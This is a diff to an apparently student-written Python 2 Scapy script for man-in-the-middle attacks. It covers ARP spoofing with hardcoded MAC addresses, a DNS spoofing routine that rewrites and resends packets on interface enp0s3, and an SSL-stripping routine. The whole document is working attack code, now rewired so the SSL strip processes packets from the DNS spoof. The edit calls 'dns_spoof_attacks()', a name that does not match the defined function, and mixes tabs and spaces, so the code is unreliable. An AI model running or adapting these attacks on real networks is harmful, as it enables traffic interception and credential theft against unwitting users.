@@ -9,6 +9,7 @@ trapUrl = "www.google.com"
 ipTrap = "142.251.32.100"
 ip6Mal = ""
 verbose = False
+type = "0"
 
 def ARP_spoofing():
     macM1 = "08:00:27:b7:c4:af"
@@ -47,7 +48,7 @@ def dns_spoof_attack():
     if verbose:
         print "Starting DNS spoof attack"
 
-    packets = sniff(filter='udp port 53', count=16, prn=process_packet)
+    return sniff(filter='udp port 53', count=16, prn=process_packet)
     # for packet in packets:
     #     if packet.haslayer(DNS):
     #         dns_packet = packet[DNS]
@@ -91,7 +92,9 @@ def process_packet(packet):
                 del packet[IP].len
                 del packet[UDP].chksum
                 del packet[UDP].len
-                sendp(packet, iface = "enp0s3", verbose=True)
+		
+		if (not type=="3"):
+                    sendp(packet, iface = "enp0s3", verbose=True)
 
             # Display complete DNS packet information
             
@@ -117,15 +120,15 @@ def ssl_strip(packet):
             del packet[TCP].chksum
 
             print "Send altered packet"
-            send(packet,verbose=0)
+            send(packet, iface="enp0s3", verbose=0)
 
 def ssl_strip_attack():
     if verbose:
         print "Starting SSL strip attack"
 
-    # prn = function to apply to each sniffed packet
-    sniff(filter="tcp and port 80",count=10, prn=ssl_strip)
-	
+    packets = dns_spoof_attacks()
+    for packet in packets:
+	ssl_strip(packet)
 
 # =============== Text Interface ===============
 
